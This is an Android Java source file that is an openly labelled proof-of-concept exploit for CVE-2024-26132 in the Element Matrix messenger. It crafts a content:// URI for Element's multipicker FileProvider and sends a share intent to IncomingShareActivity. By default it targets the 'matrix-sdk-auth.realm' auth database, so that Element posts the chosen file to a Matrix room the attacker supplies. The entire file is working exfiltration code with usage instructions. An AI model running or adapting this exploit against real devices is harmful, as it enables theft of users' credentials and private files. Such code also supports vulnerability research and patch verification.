package com.example.elementexfiltrate;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
    private static final String TAG = "ElementExfiltrate";
    public static final String EXTRA_TARGET_FILE = "target_file";
    public static final String EXTRA_ROOM_ID = "room_id";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d(TAG, "*** ELEMENT FILE EXFILTRATION EXPLOIT - CVE-2024-26132 ***");

        try {
            // Get target file and room ID from intent extras
            String targetFile = getIntent().getStringExtra(EXTRA_TARGET_FILE);
            String roomId = getIntent().getStringExtra(EXTRA_ROOM_ID);

            if (targetFile == null || targetFile.isEmpty()) {
                // Default: exfiltrate auth database
                targetFile = "matrix-sdk-auth.realm";
            }

            if (roomId == null || roomId.isEmpty()) {
                Log.w(TAG, "No room ID provided - exploit requires a target Matrix room");
                Log.w(TAG, "Usage: --es target_file 'filename' --es room_id '!roomid:server'");
                finish();
                return;
            }

            Log.d(TAG, "=== CVE-2024-26132 FILE EXFILTRATION EXPLOIT ===");
            Log.d(TAG, "Target file: " + targetFile);
            Log.d(TAG, "Target room: " + roomId);

            // Try Element debug package first, then release
            boolean success = attemptExfiltration("im.vector.app.debug", targetFile, roomId) ||
                             attemptExfiltration("im.vector.app", targetFile, roomId);

            if (success) {
                Log.d(TAG, "SUCCESS: File exfiltration exploit launched");
                Log.d(TAG, "File " + targetFile + " should be sent to room " + roomId);
            } else {
                Log.w(TAG, "FAILED: Could not launch exfiltration exploit");
            }

            Log.d(TAG, "=== EXPLOIT EXECUTION COMPLETE ===");

        } catch (Exception e) {
            Log.e(TAG, "CRITICAL: Exploit exception: " + e.getMessage());
            e.printStackTrace();
        }

        // Finish immediately
        finish();
    }

    private boolean attemptExfiltration(String targetPackage, String targetFile, String roomId) {
        try {
            Log.d(TAG, "Exfiltration targeting: " + targetPackage);

            // Construct the FileProvider URI
            // Format: content://PACKAGE.multipicker.fileprovider/external_files/FILENAME
            String fileProviderAuthority = targetPackage + ".multipicker.fileprovider";
            String fileProviderPath = "external_files/" + targetFile;
            Uri fileUri = Uri.parse("content://" + fileProviderAuthority + "/" + fileProviderPath);

            Log.d(TAG, "FileProvider URI: " + fileUri.toString());

            // Create intent to IncomingShareActivity
            Intent share = new Intent();
            share.setClassName(targetPackage, "im.vector.app.features.share.IncomingShareActivity");
            share.setAction(Intent.ACTION_SEND);
            share.putExtra(Intent.EXTRA_STREAM, fileUri);
            share.putExtra(Intent.EXTRA_SHORTCUT_ID, roomId);
            share.setType("application/octet-stream");

            // Grant URI read permission (required for content:// URIs)
            share.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

            // Launch the exploit
            startActivity(share);

            Log.d(TAG, "Exfiltration intent launched for " + targetPackage);
            Log.d(TAG, "File URI: " + fileUri);
            Log.d(TAG, "Target room: " + roomId);
            return true;

        } catch (Exception e) {
            Log.w(TAG, "Exfiltration failed for " + targetPackage + ": " + e.getMessage());
            return false;
        }
    }
}
